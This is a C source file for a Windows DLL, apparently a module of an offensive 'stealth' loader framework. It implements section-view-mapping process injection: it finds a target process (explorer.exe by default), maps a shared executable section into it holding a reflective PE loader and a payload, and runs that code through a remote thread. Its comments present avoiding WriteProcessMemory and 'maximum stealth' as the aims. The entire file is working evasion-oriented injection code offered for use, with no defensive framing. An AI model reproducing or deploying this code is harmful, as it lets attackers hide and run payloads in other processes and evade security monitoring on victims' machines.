// STEALTH Section View Mapping Injection
// Stage: PREINJECT
// Rating: ★★★★☆
//
// Technique: Create section → Map into local → Copy payload → Map into remote →
// Execute Avoids WriteProcessMemory entirely - uses mapped memory instead.
//
// Uses direct NT syscalls for maximum stealth.

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


// NT Types
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#define SEC_COMMIT 0x8000000
#define SECTION_ALL_ACCESS 0xF001F

typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

// Syscall function types
typedef NTSTATUS(NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection,
    ULONG AllocationAttributes, HANDLE FileHandle);

typedef NTSTATUS(NTAPI *pfnNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(NTAPI *pfnNtUnmapViewOfSection)(HANDLE ProcessHandle,
                                                 PVOID BaseAddress);

typedef NTSTATUS(NTAPI *pfnNtClose)(HANDLE Handle);

// Stub API types
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;

typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

// Process enumeration (same as other injectors)
#define TH32CS_SNAPPROCESS 0x00000002
typedef struct tagPROCESSENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD th32ModuleID;
  DWORD cntThreads;
  DWORD th32ParentProcessID;
  LONG pcPriClassBase;
  DWORD dwFlags;
  CHAR szExeFile[260];
} PROCESSENTRY32, *LPPROCESSENTRY32;

typedef HANDLE(WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *fnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *fnProcess32Next)(HANDLE, LPPROCESSENTRY32);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;
static int g_debug = 0;
static char g_target_process[MAX_PATH] = "explorer.exe";

// Syscall pointers
static pfnNtCreateSection pNtCreateSection = NULL;
static pfnNtMapViewOfSection pNtMapViewOfSection = NULL;
static pfnNtUnmapViewOfSection pNtUnmapViewOfSection = NULL;
static pfnNtClose pNtClose = NULL;

static void init_config() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);
  char target[MAX_PATH] = {0};
  if (GetEnvironmentVariableA("STEALTH_INJECT_TARGET", target, MAX_PATH) > 0 &&
      target[0]) {
    strncpy(g_target_process, target, MAX_PATH - 1);
  }
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;
  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");
  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [SECTION] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub)
    return FALSE;
  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");
  return (g_GetPayload != NULL);
}

static BOOL ResolveSyscalls(void) {
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (!hNtdll)
    return FALSE;

  pNtCreateSection =
      (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
  pNtMapViewOfSection =
      (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
  pNtUnmapViewOfSection =
      (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
  pNtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");

  if (!pNtCreateSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection ||
      !pNtClose) {
    log_msg("Failed to resolve NT syscalls");
    return FALSE;
  }
  log_msg("NT syscalls resolved");
  return TRUE;
}

static DWORD FindProcessByName(const char *processName) {
  HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
  if (!hKernel32)
    return 0;

  fnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot =
      (fnCreateToolhelp32Snapshot)GetProcAddress(hKernel32,
                                                 "CreateToolhelp32Snapshot");
  fnProcess32First pProcess32First =
      (fnProcess32First)GetProcAddress(hKernel32, "Process32First");
  fnProcess32Next pProcess32Next =
      (fnProcess32Next)GetProcAddress(hKernel32, "Process32Next");
  if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next)
    return 0;

  HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
    return 0;

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);
  if (!pProcess32First(hSnapshot, &pe32)) {
    CloseHandle(hSnapshot);
    return 0;
  }

  DWORD pid = 0;
  do {
    if (_stricmp(pe32.szExeFile, processName) == 0) {
      pid = pe32.th32ProcessID;
      break;
    }
  } while (pProcess32Next(hSnapshot, &pe32));

  CloseHandle(hSnapshot);
  return pid;
}

// Reflective loader context
typedef struct {
  void *peBase;
  size_t peSize;
  LPVOID pLoadLibraryA;
  LPVOID pGetProcAddress;
  LPVOID pVirtualAlloc;
  LPVOID pVirtualProtect;
  LPVOID pExitThread;
} ReflectiveContext;

// Same reflective loader as other injectors
static DWORD WINAPI ReflectiveLoader(ReflectiveContext *ctx) {
  typedef HMODULE(WINAPI * pLoadLibraryA_t)(LPCSTR);
  typedef FARPROC(WINAPI * pGetProcAddress_t)(HMODULE, LPCSTR);
  typedef LPVOID(WINAPI * pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

  pLoadLibraryA_t fnLoadLibrary = (pLoadLibraryA_t)ctx->pLoadLibraryA;
  pGetProcAddress_t fnGetProcAddress = (pGetProcAddress_t)ctx->pGetProcAddress;
  pVirtualAlloc_t fnVirtualAlloc = (pVirtualAlloc_t)ctx->pVirtualAlloc;

  unsigned char *peData = (unsigned char *)ctx->peBase;

  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
  if (dosHeader->e_magic != 0x5A4D)
    return 1;

  PIMAGE_NT_HEADERS ntHeaders =
      (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
  if (ntHeaders->Signature != 0x00004550)
    return 2;

  DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
  LPVOID imageBase =
      fnVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!imageBase)
    imageBase = fnVirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
  if (!imageBase)
    return 3;

  for (DWORD i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++)
    ((unsigned char *)imageBase)[i] = peData[i];

  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
  for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData > 0) {
      unsigned char *dest =
          (unsigned char *)imageBase + section[i].VirtualAddress;
      unsigned char *src = peData + section[i].PointerToRawData;
      for (DWORD j = 0; j < section[i].SizeOfRawData; j++)
        dest[j] = src[j];
    }
  }

  ULONGLONG delta = (ULONGLONG)imageBase - ntHeaders->OptionalHeader.ImageBase;
  if (delta != 0 &&
      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
              .Size > 0) {
    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)((unsigned char *)imageBase +
                                 ntHeaders->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);
    while (reloc->VirtualAddress) {
      DWORD numRelocs =
          (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
      WORD *relocData = (WORD *)(reloc + 1);
      for (DWORD i = 0; i < numRelocs; i++) {
        int type = relocData[i] >> 12;
        int offset = relocData[i] & 0xFFF;
        if (type == IMAGE_REL_BASED_DIR64) {
          ULONGLONG *addr = (ULONGLONG *)((unsigned char *)imageBase +
                                          reloc->VirtualAddress + offset);
          *addr += delta;
        } else if (type == IMAGE_REL_BASED_HIGHLOW) {
          DWORD *addr = (DWORD *)((unsigned char *)imageBase +
                                  reloc->VirtualAddress + offset);
          *addr += (DWORD)delta;
        }
      }
      reloc =
          (PIMAGE_BASE_RELOCATION)((unsigned char *)reloc + reloc->SizeOfBlock);
    }
  }

  if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size > 0) {
    PIMAGE_IMPORT_DESCRIPTOR importDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char *)imageBase +
                                   ntHeaders->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);
    while (importDesc->Name) {
      HMODULE hDll = fnLoadLibrary(
          (LPCSTR)((unsigned char *)imageBase + importDesc->Name));
      if (hDll) {
        PIMAGE_THUNK_DATA thunk =
            (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                importDesc->FirstThunk);
        PIMAGE_THUNK_DATA origThunk =
            importDesc->OriginalFirstThunk
                ? (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                      importDesc->OriginalFirstThunk)
                : thunk;
        while (origThunk->u1.AddressOfData) {
          if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
            thunk->u1.Function = (ULONGLONG)fnGetProcAddress(
                hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
          } else {
            PIMAGE_IMPORT_BY_NAME importByName =
                (PIMAGE_IMPORT_BY_NAME)((unsigned char *)imageBase +
                                        origThunk->u1.AddressOfData);
            char exitProc[] = {'E', 'x', 'i', 't', 'P', 'r',
                               'o', 'c', 'e', 's', 's', 0};
            int match = 1;
            for (int k = 0; exitProc[k] && match; k++)
              if (importByName->Name[k] != exitProc[k])
                match = 0;
            if (match && importByName->Name[11] == 0)
              thunk->u1.Function = (ULONGLONG)ctx->pExitThread;
            else
              thunk->u1.Function =
                  (ULONGLONG)fnGetProcAddress(hDll, importByName->Name);
          }
          thunk++;
          origThunk++;
        }
      }
      importDesc++;
    }
  }

  typedef BOOL(WINAPI * DllMain_t)(HINSTANCE, DWORD, LPVOID);
  DllMain_t entryPoint =
      (DllMain_t)((unsigned char *)imageBase +
                  ntHeaders->OptionalHeader.AddressOfEntryPoint);
  if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL)
    entryPoint((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
  else
    ((void (*)(void))entryPoint)();

  return 0;
}

static BOOL PerformSectionInjection(StealthPayload *payload) {
  char buf[512];
  HANDLE hSection = NULL;
  PVOID localBase = NULL;
  PVOID remoteBase = NULL;
  SIZE_T viewSize = 0;
  HANDLE hProcess = NULL;

  sprintf(buf, "Starting Section View Mapping injection into %s",
          g_target_process);
  log_msg(buf);

  DWORD targetPid = FindProcessByName(g_target_process);
  if (targetPid == 0) {
    sprintf(buf, "Target process '%s' not found", g_target_process);
    log_msg(buf);
    return FALSE;
  }

  sprintf(buf, "Target PID: %lu", (unsigned long)targetPid);
  log_msg(buf);

  // Calculate total size
  size_t loaderSize = 4096; // Fixed estimate for position-independent loader
  size_t totalSize =
      loaderSize + sizeof(ReflectiveContext) + payload->size + 0x1000;

  // Step 1: Create section
  LARGE_INTEGER sectionSize;
  sectionSize.QuadPart = totalSize;

  NTSTATUS status =
      pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
                       PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtCreateSection failed: 0x%08lX", status);
    log_msg(buf);
    return FALSE;
  }

  log_msg("Created section");

  // Step 2: Map view into LOCAL process first
  viewSize = totalSize;
  status =
      pNtMapViewOfSection(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL,
                          &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtMapViewOfSection (local) failed: 0x%08lX", status);
    log_msg(buf);
    pNtClose(hSection);
    return FALSE;
  }

  sprintf(buf, "Mapped view locally at %p", localBase);
  log_msg(buf);

  // Step 3: Copy loader + context + PE to local view (NO WriteProcessMemory
  // used!)
  PVOID localLoaderAddr = localBase;
  PVOID localContextAddr = (char *)localBase + loaderSize;
  PVOID localPEAddr = (char *)localContextAddr + sizeof(ReflectiveContext) + 64;

  // Copy reflective loader code
  memcpy(localLoaderAddr, ReflectiveLoader, loaderSize);

  // Prepare context - pointers will be updated for remote
  ReflectiveContext ctx = {0};
  ctx.peSize = payload->size;
  ctx.pLoadLibraryA =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
  ctx.pGetProcAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "GetProcAddress");
  ctx.pVirtualAlloc =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
  ctx.pVirtualProtect = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "VirtualProtect");
  ctx.pExitThread =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");

  // Copy PE data
  memcpy(localPEAddr, payload->data, payload->size);

  log_msg("Copied loader, context, and PE to local view");

  // Step 4: Open target process
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
  if (!hProcess) {
    sprintf(buf, "OpenProcess failed: %lu", GetLastError());
    log_msg(buf);
    pNtUnmapViewOfSection(GetCurrentProcess(), localBase);
    pNtClose(hSection);
    return FALSE;
  }

  // Step 5: Map same section into REMOTE process
  viewSize = totalSize;
  status = pNtMapViewOfSection(hSection, hProcess, &remoteBase, 0, 0, NULL,
                               &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtMapViewOfSection (remote) failed: 0x%08lX", status);
    log_msg(buf);
    pNtUnmapViewOfSection(GetCurrentProcess(), localBase);
    pNtClose(hSection);
    CloseHandle(hProcess);
    return FALSE;
  }

  sprintf(buf, "Mapped view in remote process at %p", remoteBase);
  log_msg(buf);

  // Step 6: Update context with remote addresses and re-copy
  PVOID remoteContextAddr = (char *)remoteBase + loaderSize;
  PVOID remotePEAddr =
      (char *)remoteContextAddr + sizeof(ReflectiveContext) + 64;
  ctx.peBase = remotePEAddr;
  memcpy(localContextAddr, &ctx, sizeof(ctx));

  log_msg("Updated context with remote addresses");

  // Step 7: Create remote thread to execute loader
  HANDLE hThread =
      CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase,
                         remoteContextAddr, 0, NULL);
  if (!hThread) {
    sprintf(buf, "CreateRemoteThread failed: %lu", GetLastError());
    log_msg(buf);
    pNtUnmapViewOfSection(hProcess, remoteBase);
    pNtUnmapViewOfSection(GetCurrentProcess(), localBase);
    pNtClose(hSection);
    CloseHandle(hProcess);
    return FALSE;
  }

  log_msg("Created remote thread");
  WaitForSingleObject(hThread, 5000);

  DWORD exitCode = 0;
  GetExitCodeThread(hThread, &exitCode);
  sprintf(buf, "Loader exit code: %lu", exitCode);
  log_msg(buf);

  CloseHandle(hThread);
  // Leave remote view mapped - payload needs it
  pNtUnmapViewOfSection(GetCurrentProcess(), localBase);
  pNtClose(hSection);
  CloseHandle(hProcess);

  log_msg("SUCCESS: Section View Mapping injection complete");
  return TRUE;
}

static BOOL PerformInjection(void) {
  log_msg("=== Section View Mapping Injector Starting ===");

  if (!ResolveSyscalls())
    return FALSE;
  if (!ResolveStubExports()) {
    log_msg("Failed to resolve stub exports");
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("No payload available");
    return FALSE;
  }

  char buf[256];
  sprintf(buf, "Payload: %zu bytes, is_pe=%d", payload->size, payload->is_pe);
  log_msg(buf);

  if (!payload->is_pe) {
    log_msg("Section mapping requires PE payload for reflective loading");
    return FALSE;
  }

  if (PerformSectionInjection(payload)) {
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
      log_msg("Signaled injection handled");
    }
    return TRUE;
  }

  return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_config();
    log_msg("Section View Mapping Injector loaded");
    PerformInjection();
  }
  return TRUE;
}
